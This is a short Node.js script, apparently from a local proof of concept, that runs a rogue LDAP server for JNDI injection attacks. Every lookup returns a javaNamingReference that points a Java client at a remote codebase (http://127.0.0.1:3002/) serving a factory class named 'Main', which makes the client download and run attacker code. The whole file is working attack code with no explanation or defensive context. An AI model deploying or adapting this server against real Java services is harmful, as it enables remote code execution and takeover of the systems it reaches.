const ldap = require('ldapjs');

const server = ldap.createServer();

server.search('', (req, res, next) => {
    console.log("Lookup");

    res.send({
        dn: req.dn.toString(),
        attributes: {
            objectClass: ['javaNamingReference'],
            javaClassName: 'Main',
            javaFactory: ['Main'],
            javaCodebase: ['http://127.0.0.1:3002/'],
        }
    });
    res.end();
});

server.listen(3001, '127.0.0.1', () => {
    console.log('LDAP server listening at %s', server.url);
});